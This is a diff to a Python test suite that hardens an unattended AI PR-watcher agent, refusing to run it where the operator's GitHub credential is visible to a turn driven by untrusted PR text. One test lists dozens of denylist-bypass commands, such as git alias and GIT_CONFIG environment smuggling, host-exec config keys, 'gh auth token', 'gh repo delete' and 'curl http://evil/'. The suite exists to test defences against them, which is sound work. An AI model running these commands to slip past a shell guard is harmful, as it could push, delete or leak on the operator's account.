@@ -1815,14 +1815,16 @@ class TestTheFallbackNeverBypassesAConfiguredProvider:
         from unittest.mock import patch
 
         from kiro_crew.apps.builtins.auto_improvement.backend import pr_watchers as W
+        from kiro_crew.apps.builtins.auto_improvement.backend import runner as R
         from kiro_crew.apps.builtins.auto_improvement.spine import agent_runner as ar
 
         st = W.WatcherState(fp="fp1", pr="https://github.com/o/r/pull/1")
         registry = W.PRWatcherRegistry()
         with (
-            # The egress gate fires FIRST and is a separate refusal; accept it so this test
-            # reaches the subprocess-fallback refusal it is actually about.
+            # The egress and credential gates fire FIRST and are separate refusals; accept
+            # both so this test reaches the subprocess-fallback refusal it is actually about.
             patch.object(W, "_watcher_egress_accepted", lambda: True),
+            patch.object(R, "_credentials_are_unconfined", lambda: ""),
             patch.object(ar.SessionAgentRunner, "available", staticmethod(lambda: True)),
             patch.object(ar.SessionAgentRunner, "ensure_agent_registered", lambda self: False),
             patch.object(ar.AgentRunner, "available", staticmethod(lambda: True)),
@@ -1844,12 +1846,14 @@ class TestTheFallbackNeverBypassesAConfiguredProvider:
         from unittest.mock import patch
 
         from kiro_crew.apps.builtins.auto_improvement.backend import pr_watchers as W
+        from kiro_crew.apps.builtins.auto_improvement.backend import runner as R
         from kiro_crew.apps.builtins.auto_improvement.spine import agent_runner as ar
 
         st = W.WatcherState(fp="fp1", pr="https://github.com/o/r/pull/1")
         registry = W.PRWatcherRegistry()
         with (
             patch.object(W, "_watcher_egress_accepted", lambda: True),
+            patch.object(R, "_credentials_are_unconfined", lambda: ""),
             patch.object(ar.SessionAgentRunner, "available", staticmethod(lambda: False)),
             patch.object(ar.AgentRunner, "available", staticmethod(lambda: True)),
         ):
@@ -1969,6 +1973,315 @@ class TestTheWatcherRefusesToRunWithoutEgressAcknowledgement:
         )
 
 
+class TestTheWatcherRefusesToRunWithTheOperatorsGithubCredential:
+    """D-143. The watcher path had NO tier check, and the claim that it did not need one was
+    measured on a path production never takes.
+
+    D-73 said "a watcher cannot publish to the pull request"; D-84 declined removing `Bash`
+    because publishing is "blocked one layer down … enforced rather than pattern-matched" by
+    `strip_credential_env` + `sandboxed_spawn_argv(mode="strict")` hiding `~/.config/gh`; and
+    the `security_posture` disclosure behind `watcherAcceptEgressRisk` told the operator
+    "credential stores are hidden by the strict sandbox (verified)". All three describe the
+    `claude -p` SUBPROCESS spawn — which `_make_runner` refuses. The only production path is
+    `SessionAgentRunner` → `create_provider_factory` → `AcpProvider(sandbox_mode=agent.sandbox)`
+    → `wrap_argv`, and the shipped `auto`/`standard` tier does not list `.config/gh`. So an
+    unattended turn whose prompt embeds outsider-written PR text held the operator's GitHub
+    OAuth credential, with a verb denylist as the only publish control.
+
+    The gate is the boundary; the denylist stays a barrier. These tests pin the WATCHER'S
+    EFFECTIVE TIER, which is the thing `TestWatcherSandboxConfinesCredentialsButNotEgress`
+    never asserted (it checked `_STRICT_DIRS`, a tier this path never selects — which is how
+    the false claim survived four review rounds).
+    """
+
+    def _registry(self):
+        from kiro_crew.apps.builtins.auto_improvement.backend import pr_watchers as W
+
+        return W, W.PRWatcherRegistry()
+
+    def test_an_exposed_credential_store_refuses_the_runner(self, monkeypatch) -> None:
+        """Verified RED pre-fix: `_make_runner` built a `SessionAgentRunner` at any tier."""
+        import threading
+
+        from kiro_crew.apps.builtins.auto_improvement.backend import runner as R
+
+        W, registry = self._registry()
+        # Egress accepted, credentials NOT confined — the exact production shape reported.
+        monkeypatch.setattr(W, "_watcher_egress_accepted", lambda: True)
+        monkeypatch.setattr(R, "_credentials_are_unconfined", lambda: "the tier exposes it")
+        st = W.WatcherState(fp="fp1", pr="https://github.com/o/r/pull/1")
+        with pytest.raises(RuntimeError, match="GitHub credential"):
+            registry._make_runner(st, threading.Event())
+
+    def test_the_egress_acknowledgement_alone_does_not_grant_the_credential(
+        self, monkeypatch
+    ) -> None:
+        """The two consents are separate on purpose.
+
+        `watcherAcceptEgressRisk` concedes that a turn can reach the network FROM a sandbox
+        its own disclosure describes as credential-free. It cannot also stand as consent to
+        hand that turn the operator's GitHub login — that is what made the original consent
+        false. So an operator who set only the egress flag still gets a refusal.
+        """
+        import threading
+
+        W, registry = self._registry()
+        monkeypatch.setattr(
+            W.store, "read_json", lambda *_a, **_k: {"watcherAcceptEgressRisk": True}
+        )
+        st = W.WatcherState(fp="fp2", pr="https://github.com/o/r/pull/2")
+        with pytest.raises(RuntimeError, match="watcher runner refused"):
+            registry._make_runner(st, threading.Event())
+
+    def test_the_gate_precedes_the_runner_construction(self) -> None:
+        """Structural: a refusal after the construction is not a refusal."""
+        import inspect
+
+        from kiro_crew.apps.builtins.auto_improvement.backend import pr_watchers as W
+
+        src = inspect.getsource(W.PRWatcherRegistry._make_runner)
+        assert "_credentials_are_unconfined()" in src, (
+            "the watcher builder does not check credential confinement, so an unattended "
+            "turn driven by untrusted PR text can use the operator's GitHub identity"
+        )
+        assert src.index("_credentials_are_unconfined()") < src.index("SessionAgentRunner("), (
+            "the credential gate runs AFTER the runner is constructed — it must refuse first"
+        )
+
+    def test_the_two_runners_share_one_definition_of_confinement(self) -> None:
+        """Shared, not copied. The whole defect was one unattended runner having a check the
+        other did not; two copies of a tier decision drift back into that state."""
+        import inspect
+
+        from kiro_crew.apps.builtins.auto_improvement.backend import pr_watchers as W
+
+        src = inspect.getsource(W.PRWatcherRegistry._make_runner)
+        assert "from .runner import _credentials_are_unconfined" in src, (
+            "the watcher builder defines its own confinement check instead of sharing the "
+            "loop's — the two can now disagree about what confinement means"
+        )
+
+    def test_both_gates_are_re_asserted_before_every_pass(self, monkeypatch) -> None:
+        """A runner is built ONCE and then drives up to `max_nudges` turns over hours.
+
+        So a build-time-only check let a watcher started while opted in keep running after
+        the operator revoked the acknowledgement or a fleet raised the sandbox floor — the
+        egress gate's own comment claimed "turning the flag off immediately stops new
+        passes", which was true of new WATCHERS, not of an in-flight one.
+        """
+        import threading
+
+        W, registry = self._registry()
+        # No injected factory: the production shape, where the re-check is live.
+        monkeypatch.setattr(W, "_watcher_egress_accepted", lambda: False)
+        monkeypatch.setattr(
+            registry,
+            "_fetch_status",
+            lambda st, loop: {"ok": True, "verdict": "NEEDS_WORK", "verdictReason": "red"},
+        )
+        ran: list[object] = []
+        monkeypatch.setattr(
+            registry, "_run_agent_pass", lambda *a: (ran.append(a), True)[1], raising=False
+        )
+        monkeypatch.setattr(
+            registry, "_ensure_clone", lambda *a: ("/tmp/clone", True), raising=False
+        )
+        st = W.WatcherState(fp="fp5", pr="https://github.com/o/r/pull/5", max_nudges=2)
+        with registry._lock:
+            registry._watchers["fp5"] = st
+        registry._nudge_loop(st, "", threading.Event(), None, object())
+        assert ran == [], "a pass ran after the acknowledgement was revoked"
+        assert st.status == W.STATUS_ERROR
+        assert "watcherAcceptEgressRisk" in st.last_note
+
+    def test_the_re_check_precedes_the_pass_and_the_clone(self) -> None:
+        """Structural: a revoked watcher must do no git work either, so the re-check sits
+        before `_ensure_clone`, not merely before the agent turn."""
+        import inspect
+
+        from kiro_crew.apps.builtins.auto_improvement.backend import pr_watchers as W
+
+        src = inspect.getsource(W.PRWatcherRegistry._nudge_loop)
+        assert "_watcher_preconditions_refusal()" in src, (
+            "`_nudge_loop` never re-reads the gates, so a revocation cannot stop an "
+            "in-flight watcher"
+        )
+        assert src.index("_watcher_preconditions_refusal()") < src.index("_ensure_clone("), (
+            "the re-check runs after the clone is prepared — a revoked watcher still does "
+            "git work"
+        )
+
+    def test_the_github_token_env_is_emptied_for_the_session(self) -> None:
+        """The ENV half, enforced on every path regardless of tier.
+
+        `strip_credential_env` runs only in the subprocess spawn `_make_runner` refuses, so a
+        `GH_TOKEN`/`GITHUB_TOKEN` in the gateway's environment was inherited straight into the
+        unattended session. Emptied rather than deleted because the provider merges
+        `extra_env` over the gateway environment, and empty IS unset for `gh`/`git`.
+        """
+        from kiro_crew.apps.builtins.auto_improvement.backend import pr_watchers as W
+
+        scrub = W._github_credential_env_scrub()
+        for name in ("GH_TOKEN", "GITHUB_TOKEN", "GH_ENTERPRISE_TOKEN"):
+            assert scrub.get(name) == "", f"{name} is not neutralized for the watcher session"
+        # Scoped to the GitHub family: emptying AWS_SESSION_TOKEN would break kiro-cli's own
+        # authentication, which the standard tier deliberately leaves in place.
+        assert not any("AWS" in name for name in scrub), (
+            "the scrub reaches kiro-cli's own credentials — breaking the provider is not a "
+            "security improvement"
+        )
+
+    def test_the_runner_is_built_with_the_scrub(self) -> None:
+        """Structural: computing the scrub and not passing it would be a no-op."""
+        import inspect
+
+        from kiro_crew.apps.builtins.auto_improvement.backend import pr_watchers as W
+
+        src = inspect.getsource(W.PRWatcherRegistry._make_runner)
+        assert "extra_env=_github_credential_env_scrub()" in src, (
+            "the watcher's session is built without the credential scrub"
+        )
+
+    def test_the_session_runner_fails_closed_when_the_scrub_cannot_be_applied(self) -> None:
+        """A factory that cannot take `extra_env` must FAIL, not silently run unscrubbed.
+
+        The old kwarg-probing chain retried with fewer arguments on `TypeError`, which for a
+        credential scrub is the wrong direction: it looks like graceful degradation and hands
+        the token over.
+        """
+        from kiro_crew.apps.builtins.auto_improvement.spine.agent_runner import (
+            SessionAgentRunner,
+        )
+
+        def _factory(session_key, **kwargs):
+            raise TypeError("unexpected keyword argument 'extra_env'")
+
+        runner = SessionAgentRunner(
+            provider_factory=_factory, extra_env={"GH_TOKEN": ""}, default_timeout_s=1.0
+        )
+        result = runner.run("noop", cwd=None, allowed_tools=["Bash"], timeout_s=1.0)
+        assert result.ok is False
+        assert "extra_env" in result.error, result.error
+
+    def test_the_publish_denylist_is_not_relied_on_as_the_boundary(self) -> None:
+        """The bypasses traced in the report, kept as a standing statement of WHY the gate
+        above has to exist: these are the shapes a command-line matcher cannot see.
+
+        `bash fix.sh` and `python3 helper.py` name a file the agent's own allowed `Write`
+        tool authored, so the payload is not in the command being judged. They stay ALLOWED
+        deliberately — the watcher's documented job is to run the repository's own
+        build/test/lint — and chasing the spelling would narrow an unbounded set by one while
+        breaking the feature. What makes them inert is that the turn holds no GitHub login.
+        """
+        from kiro_crew.apps.builtins.auto_improvement.spine.agent_runner import (
+            shell_command_refusal,
+        )
+
+        # Closed, because the payload IS in the command line.
+        for command in (
+            "git -c alias.p=push p https://github.com/o/r HEAD:main",
+            "git --config-env=alias.p=V p https://github.com/o/r HEAD:main",
+            "git config alias.p push",
+            "git config --global alias.p push",
+            # The same rename through the ENVIRONMENT, which the tokenizer drops before it
+            # reads the binary. Measured against real git: both forms run the aliased verb.
+            "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.p GIT_CONFIG_VALUE_0=push git p",
+            "GIT_CONFIG_PARAMETERS='alias.p=push' git p",
+            "env GIT_CONFIG_KEY_0=alias.p git p",
+            "git send-pack https://github.com/o/r HEAD:main",
+            "git -c credential.helper=/tmp/x fetch",
+            "git -c core.fsmonitor=/tmp/x status",
+            "gh alias set p 'pr comment'",
+            "gh repo delete o/r",
+            "gh repo edit --visibility public",
+            "gh gist create secret.txt",
+            "gh ssh-key add /tmp/id.pub",
+            "gh variable set X --body y",
+            "gh pr lock 12",
+            "gh auth token",
+            "glab mr merge 3",
+            # A valueless wrapper option swallowing the binary the allowlist guards: the
+            # consumption guard consulted the two DENY tables and not the new allow table,
+            # so `glab` (allowlisted only) was eaten while `gh`/`git` were not.
+            "stdbuf -o0 glab mr merge 3",
+            "env -i glab mr merge 3",
+            "sudo -i glab mr merge 3",
+            "bash -c 'stdbuf -o0 glab mr merge 3'",
+            # `eval` re-parses its argument, exactly as `sh -c` does.
+            'eval "git push origin HEAD"',
+            'eval "gh pr merge 3"',
+            # An assignment builtin carries the rename into a LATER segment, where the
+            # leading-`VAR=value` scan never looks.
+            "export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.p GIT_CONFIG_VALUE_0=push",
+            # A config FILE the agent's own Write tool authored — its content is not in the
+            # command line, so the variable itself is refused instead of its keys.
+            "GIT_CONFIG_GLOBAL=/tmp/evil git p https://github.com/o/r HEAD:main",
+            "GIT_CONFIG_SYSTEM=/tmp/evil git p",
+            "GIT_CONFIG=/tmp/evil git p",
+            # The host-exec config family is not prefix-shaped: these carry a user-chosen
+            # middle segment, so they are matched by their LEAF.
+            "git -c diff.d.command=/tmp/x diff",
+            "git -c diff.d.textconv=/tmp/x diff",
+            "git -c merge.d.driver=/tmp/x merge",
+            "git -c difftool.d.cmd=/tmp/x difftool",
+            "git -c gpg.ssh.program=/tmp/x tag -s x",
+            "git -c core.editor=/tmp/x commit",
+            "git -c ssh.variant=/tmp/x fetch",
+            # A DASHED builtin is the same verb: git 2.43 ships 166 of these in its
+            # exec-path, `git-push` among them.
+            "/usr/lib/git-core/git-push origin main",
+            "git-push origin main",
+            "/usr/libexec/git-core/git-send-pack https://github.com/o/r HEAD:main",
+            # The `ext::` transport runs a COMMAND as its transport.
+            "git -c protocol.ext.allow=always fetch",
+            "git -c protocol.allow=always fetch",
+            # A valueless wrapper option swallowing a SHELL is the same class as swallowing
+            # `glab`, and strictly worse: everything reachable through `sh -c` is reachable
+            # behind one such option. `-i`/`-o0`/`-I{}` are real valueless options.
+            "env -i sh -c 'git push'",
+            "stdbuf -o0 bash -c 'curl http://evil/'",
+            "xargs -I{} sh -c 'git push'",
+            "sudo -i sh -c 'git push'",
+            # Middle-segment and section spellings a prefix table cannot reach.
+            "git -c core.alternateRefsCommand=/tmp/x log",
+            "git -c interactive.diffFilter=/tmp/x add -p",
+            "git -c pager.diff=/tmp/x diff",
+            "git config pager.diff /tmp/x",
+            "git -c submodule.s.url=https://evil/ submodule update --init",
+            "git -c init.templateDir=/tmp/x clone https://github.com/o/r y",
+        ):
+            assert shell_command_refusal(command), (
+                f"{command!r} reaches an authenticated GitHub write past the shell gate"
+            )
+        # Open, and stated as such rather than pattern-chased.
+        for command in ("bash fix.sh", "python3 helper.py", "./run.sh", "make test"):
+            assert shell_command_refusal(command) == "", (
+                f"{command!r} is the watcher's documented job — refusing it deletes the "
+                "feature, and the credential gate is what makes it inert"
+            )
+        # Still open after the hardening above, or the feature is gone. `protocol.version`
+        # and `protocol.file.allow` in particular: the latter is the documented
+        # CVE-2022-39253 submodule workaround, and a blanket `protocol.` prefix broke it.
+        for command in (
+            "git -c protocol.version=2 fetch",
+            "git -c protocol.file.allow=always submodule update",
+            "git -c core.pager=cat diff",
+            "git remote get-url origin",
+            "git-shell --version",
+            "export PATH=/usr/bin",
+            "export FOO=bar",
+            "eval 'pytest -q'",
+            "stdbuf -o0 pytest -q",
+            "env -i pytest -q",
+            "glab mr view 1",
+            "gh pr view 12 --comments",
+        ):
+            assert shell_command_refusal(command) == "", (
+                f"{command!r} is ordinary build or diagnostic surface — the hardening "
+                "over-refused it"
+            )
+
+
 class TestTheLoopRunnerRefusesWithoutCredentialConfinement:
     """The loop's authoring agent must not run with the operator's credential stores visible.
 
@@ -1982,9 +2295,14 @@ class TestTheLoopRunnerRefusesWithoutCredentialConfinement:
     over an unrestricted network.
 
     `_build_runner` therefore runs OFFLINE (returns None — the same fail-closed answer it
-    already gives when the tool-restricted agent cannot be registered) unless the sandbox is
-    'auto' OR the operator has acknowledged the residual risk with
-    `acceptUnsandboxedAgentRisk`. Raised by the GPT review.
+    already gives when the tool-restricted agent cannot be registered) unless the effective
+    tier is one that HIDES the credential stores (`_CREDENTIAL_HIDING_SANDBOX_MODES`, i.e.
+    'strict' alone — `auto`/`standard` deliberately expose `.aws`/`.ssh` and never listed
+    `.config/gh`, and `cc` hides `.aws`/`.kube` but not the GitHub store either) OR the
+    operator has acknowledged the residual risk with
+    `acceptUnsandboxedAgentRisk`. Raised by the GPT review; the tier read was corrected in
+    D-143, which found it was consulting a non-existent top-level `KiroCrewConfig.sandbox`
+    attribute and therefore reporting every gateway "unset" without ever looking at a tier.
     """
 
     def test_an_unconfined_sandbox_without_acknowledgement_refuses(self, monkeypatch) -> None:
@@ -1993,8 +2311,98 @@ class TestTheLoopRunnerRefusesWithoutCredentialConfinement:
         monkeypatch.setattr(R, "_unsandboxed_agent_accepted", lambda: False)
         monkeypatch.setattr(R.store, "read_json", lambda *_a, **_k: {})
         reason = R._credentials_are_unconfined()
-        assert reason, "an 'off'/unset sandbox with no acknowledgement must report unconfined"
-        assert "auto" in reason
+        assert reason, "the shipped tier with no acknowledgement must report unconfined"
+        # Names the tier it actually read and the way out, so the operator can act on it.
+        assert "acceptUnsandboxedAgentRisk" in reason
+
+    def test_the_tier_read_is_the_one_the_acp_spawn_will_be_given(self, monkeypatch) -> None:
+        """`agent.sandbox`, not a top-level attribute that does not exist.
+
+        The previous read was `getattr(KiroCrewConfig.load(), "sandbox", "")`, and
+        `KiroCrewConfig` has no top-level `sandbox` field — so the helper reported every
+        gateway 'unset' and its verdict could not track the tier `create_provider_factory`
+        passes to `AcpProvider`. Fail-closed, but not a check. Pins the CONSULTED tier
+        (D-143's fix criterion), by making a credential-hiding tier flip the answer.
+        """
+        from kiro_crew import sandbox as sb
+        from kiro_crew.apps.builtins.auto_improvement.backend import runner as R
+
+        monkeypatch.setattr(R, "_unsandboxed_agent_accepted", lambda: False)
+        monkeypatch.setattr(sb, "configured_sandbox_mode", lambda: "strict")
+        monkeypatch.setattr(sb, "effective_sandbox_mode", lambda mode: mode)
+        monkeypatch.setattr(sb, "credential_mask_applies", lambda mode: True)
+        assert R._credentials_are_unconfined() == "", (
+            "a credential-hiding tier whose mask lands must be reported CONFINED — the "
+            "helper is not reading the tier it names"
+        )
+        monkeypatch.setattr(sb, "configured_sandbox_mode", lambda: "auto")
+        assert "auto" in R._credentials_are_unconfined(), (
+            "the shipped 'auto' tier does not hide ~/.config/gh and must be reported "
+            "unconfined, naming the tier that was read"
+        )
+
+    def test_a_tier_whose_mask_never_lands_is_unconfined(self, monkeypatch) -> None:
+        """`credential_mask_applies` is the second half of the answer.
+
+        Several `wrap_argv` paths hand back an UNWRAPPED child — the `off` tier, a host with
+        no sandbox backend and unsandboxed exec opted in, an outer sandbox built for another
+        tier. On those the tier NAME says confined and no mask is ever applied, so a check
+        that stopped at the name would clear a gateway whose credential stores are readable.
+        """
+        from kiro_crew import sandbox as sb
+        from kiro_crew.apps.builtins.auto_improvement.backend import runner as R
+
+        monkeypatch.setattr(R, "_unsandboxed_agent_accepted", lambda: False)
+        monkeypatch.setattr(sb, "configured_sandbox_mode", lambda: "strict")
+        monkeypatch.setattr(sb, "effective_sandbox_mode", lambda mode: mode)
+        monkeypatch.setattr(sb, "credential_mask_applies", lambda mode: False)
+        assert "no credential mask" in R._credentials_are_unconfined()
+
+    def test_the_credential_hiding_tiers_are_the_ones_that_hide_the_gh_store(self) -> None:
+        """The tier SET is a claim about `sandbox`'s own lists; pin it against them.
+
+        Not a restatement of `_STRICT_DIRS`' contents: the assertion is that every tier this
+        app is willing to run an unattended agent at masks `~/.config/gh`, and that the
+        shipped default does not — which is the fact the old spec text got wrong.
+        """
+        from kiro_crew import sandbox as sb
+        from kiro_crew.apps.builtins.auto_improvement.backend.runner import (
+            _CREDENTIAL_HIDING_SANDBOX_MODES,
+        )
+
+        # `strict_dirs()`/`cc_dirs()`, not the module globals: those two lists are CPP
+        # extension points (`platform/interfaces.py`) and are what the strict/cc builders
+        # actually read, so a companion returning a REPLACEMENT list would leave a test
+        # against `_STRICT_DIRS` green while the gate cleared an unmasked tier. Identical on
+        # a standalone host, where the Default adapter returns the globals.
+        tiers = {
+            "standard": list(sb._STANDARD_DIRS),
+            "cc": list(sb._sandbox_policy().cc_dirs()),
+            "strict": list(sb._sandbox_policy().strict_dirs()),
+        }
+        for mode in _CREDENTIAL_HIDING_SANDBOX_MODES:
+            assert mode in tiers, f"{mode!r} is not a tier `sandbox` has a hide-list for"
+            assert ".config/gh" in tiers[mode], (
+                f"the app runs unattended agents at the {mode!r} tier but that tier does "
+                "not hide the GitHub credential store"
+            )
+        # The tiers that must stay OUT, and why the set is exactly {'strict'}: `cc` hides
+        # .aws/.kube but NOT .config/gh, so admitting it would clear the gate on a host whose
+        # governed floor is 'cc' while hosts.yml stays readable — the very defect this gate
+        # closes. Verified RED against a set of {'cc', 'strict'}.
+        for mode in ("standard", "cc"):
+            assert mode not in _CREDENTIAL_HIDING_SANDBOX_MODES, (
+                f"the {mode!r} tier is admitted as credential-hiding"
+            )
+            assert ".config/gh" not in tiers[mode], (
+                f"the {mode!r} tier hides ~/.config/gh now — widen "
+                "_CREDENTIAL_HIDING_SANDBOX_MODES rather than leaving the app refusing a "
+                "tier that is in fact confined"
+            )
+        assert sb._SANDBOX_MODE_ALIASES.get("auto") == "standard", (
+            "'auto' does not alias to 'standard', so the shipped default's tier "
+            "contents are not the ones asserted above"
+        )
 
     def test_the_acknowledgement_opts_in(self, monkeypatch) -> None:
         from kiro_crew.apps.builtins.auto_improvement.backend import runner as R
@@ -2019,20 +2427,42 @@ class TestTheLoopRunnerRefusesWithoutCredentialConfinement:
 
     def test_an_unreadable_config_fails_closed(self, monkeypatch) -> None:
         """A sandbox state we cannot VERIFY is treated as unconfined — the alternative is
-        running the agent with credentials visible on the strength of a failed read."""
+        running the agent with credentials visible on the strength of a failed read.
+
+        Patches what the helper ACTUALLY consults. Pointing a stub at
+        `kiro_crew.config.KiroCrewConfig` pinned nothing: the tier read goes through
+        `sandbox.configured_sandbox_mode`, which imports `config.loader.KiroCrewConfig` (a
+        different module attribute) and swallows the failure itself, so the test passed only
+        because the fallback tier is refused anyway.
+        """
+        from kiro_crew import sandbox as sb
         from kiro_crew.apps.builtins.auto_improvement.backend import runner as R
 
         monkeypatch.setattr(R, "_unsandboxed_agent_accepted", lambda: False)
 
-        class _Boom:
-            @staticmethod
-            def load():
-                raise OSError("config is unreadable")
+        def _boom(*_a, **_k):
+            raise OSError("the sandbox tier is unreadable")
 
-        import kiro_crew.config as cfgmod
+        monkeypatch.setattr(sb, "effective_sandbox_mode", _boom)
+        assert "could not be read" in R._credentials_are_unconfined(), (
+            "an unreadable sandbox tier must fail closed"
+        )
+        # ...and so must an unverifiable MASK, which is a second read of a second thing.
+        monkeypatch.setattr(sb, "effective_sandbox_mode", lambda mode: "strict")
+        monkeypatch.setattr(sb, "configured_sandbox_mode", lambda: "strict")
+        monkeypatch.setattr(sb, "credential_mask_applies", _boom)
+        assert "could not be verified" in R._credentials_are_unconfined()
 
-        monkeypatch.setattr(cfgmod, "KiroCrewConfig", _Boom)
-        assert R._credentials_are_unconfined(), "an unreadable sandbox setting must fail closed"
+    def test_an_unreadable_acknowledgement_is_not_an_acknowledgement(self, monkeypatch) -> None:
+        """The opt-in read sat outside the try, so a raising `store.read_json` escaped the
+        helper instead of reading as "not acknowledged"."""
+        from kiro_crew.apps.builtins.auto_improvement.backend import runner as R
+
+        def _boom(*_a, **_k):
+            raise OSError("the config file is unreadable")
+
+        monkeypatch.setattr(R.store, "read_json", _boom)
+        assert R._credentials_are_unconfined(), "an unreadable opt-in must not opt in"
 
     def test_the_gate_precedes_the_runner_construction(self) -> None:
         """Structural: the check must refuse BEFORE a runner is built, and `_build_runner` must
@@ -5267,6 +5697,14 @@ class TestANestedProcessCannotAuthenticateToGitHub:
     `gh auth status` reports "You are not logged into any GitHub hosts" (rc=1). So the
     escalation this finding describes ends at an unauthenticated `gh`. The denylist remains
     valuable as defence in depth for the DIRECT command; it was never the only control.
+
+    SCOPE, corrected by D-143: everything above is a property of the ``claude -p`` SUBPROCESS
+    spawn, and `pr_watchers._make_runner` REFUSES that spawn — so none of it described the
+    path a production watcher takes, which resolves its sandbox from `agent.sandbox` and gets
+    a tier that does not hide `~/.config/gh`. These tests still pin the subprocess path's two
+    mechanisms, which are real; what makes the same statement true of the PROVIDER path is
+    `_make_runner`'s credential gate plus its per-session token scrub, pinned in
+    `TestTheWatcherRefusesToRunWithTheOperatorsGithubCredential`.
     """
 
     def test_the_env_route_is_closed(self) -> None:
@@ -6640,11 +7078,15 @@ class TestWatcherSandboxConfinesCredentialsButNotEgress:
     feature rather than hardening it. But the second report added a claim D-84 never tested,
     and re-measuring showed it is CORRECT:
 
-      * CREDENTIALS are confined. A nested process under `mode="strict"` sees `~/.aws`,
-        `~/.config/gh` and `~/.docker` as EMPTY on a host where they are populated, and
-        `~/.ssh` exposes only `known_hosts` (deliberate — host-key verification needs it)
-        while `id_rsa`/`*.key` stay hidden. `gh auth status` reports "not logged into any
-        GitHub hosts".
+      * CREDENTIALS are confined — but by a REFUSAL, and the measurement below belongs to a
+        path production never takes. A nested process under `mode="strict"` does see
+        `~/.aws`, `~/.config/gh` and `~/.docker` EMPTY on a populated host, with `~/.ssh`
+        exposing only `known_hosts` (deliberate — host-key verification needs it) while
+        `id_rsa`/`*.key` stay hidden.
+        That is the `claude -p` SUBPROCESS spawn, which `_make_runner` refuses. Production
+        watchers run at `agent.sandbox`, whose shipped `auto`/`standard` tier does NOT hide
+        `~/.config/gh` — so the confinement now comes from `_make_runner` refusing to build
+        a runner at such a tier (D-143), which is what the tier test below pins.
       * NETWORK EGRESS is NOT confined. The sandbox never enters a network namespace
         (`CLONE_NEWNET` appears nowhere in `sandbox.py`, and its own docstring explains that
         agentic commands need reachable networking). `curl`/`wget`/`nc` are on
@@ -6665,6 +7107,37 @@ class TestWatcherSandboxConfinesCredentialsButNotEgress:
             assert required in _STRICT_DIRS, (
                 f"{required} left the strict hide-list — a nested watcher process can now read it"
             )
+
+    def test_the_tier_the_watcher_actually_runs_at_is_the_one_gated(self) -> None:
+        """The assertion the class was missing, and the reason a false claim survived here.
+
+        Every test above is about `strict`, which the production watcher path never selects:
+        `_make_runner` refuses both `claude -p` fallbacks and builds `SessionAgentRunner`,
+        which resolves its sandbox from `agent.sandbox` (default `auto` → `standard`). So
+        pin the EFFECTIVE tier instead — that the shipped default is NOT credential-hiding,
+        and that the app therefore refuses to run an unattended agent there. D-143.
+        """
+        from kiro_crew import sandbox as sb
+        from kiro_crew.apps.builtins.auto_improvement.backend.runner import (
+            _CREDENTIAL_HIDING_SANDBOX_MODES,
+        )
+        from kiro_crew.config import KiroCrewConfig
+
+        shipped = str(KiroCrewConfig().agent.sandbox)
+        resolved = sb._SANDBOX_MODE_ALIASES.get(shipped, shipped)
+        assert resolved not in _CREDENTIAL_HIDING_SANDBOX_MODES, (
+            "the shipped sandbox tier now hides the credential stores — widen "
+            "_CREDENTIAL_HIDING_SANDBOX_MODES so watchers are not refused at a tier that "
+            "is in fact confined"
+        )
+        assert ".config/gh" not in sb._STANDARD_DIRS, (
+            "the standard tier hides ~/.config/gh now — revisit D-143, whose whole premise "
+            "is that it does not"
+        )
+        assert ".config/gh" not in sb._CC_DIRS, (
+            "the cc tier hides ~/.config/gh now — it did not, which is why only 'strict' "
+            "is admitted as credential-hiding"
+        )
 
     def test_ssh_keys_are_hidden_while_known_hosts_is_exposed(self) -> None:
         """The one deliberate exception, asserted so a future edit cannot widen it to the
@@ -6695,6 +7168,26 @@ class TestWatcherSandboxConfinesCredentialsButNotEgress:
         blob = str(build_posture_snapshot()).lower()
         assert "egress" in blob or "network" in blob, (
             "the watcher's un-confined network egress is not disclosed anywhere"
+        )
+
+    def test_the_disclosure_does_not_claim_a_confinement_the_default_tier_lacks(self) -> None:
+        """The consent this disclosure collects has to describe the boundary that IS enforced.
+
+        It said "credential stores are hidden by the strict sandbox (verified)" — true of the
+        refused `claude -p` spawn, false of the path production watchers take, so the
+        operator's `watcherAcceptEgressRisk` was given on a false premise (D-143). The text
+        must now name the refusal and the second acknowledgement instead.
+        """
+        from kiro_crew.security_posture import build_posture_snapshot
+
+        blob = str(build_posture_snapshot())
+        assert "hidden by the strict sandbox" not in blob, (
+            "the disclosure still claims strict-sandbox credential hiding for a path that "
+            "runs at the gateway's own tier"
+        )
+        assert "acceptUnsandboxedAgentRisk" in blob, (
+            "the credential acknowledgement the watcher now requires is not disclosed, so "
+            "the operator cannot know what setting it concedes"
         )
 
 
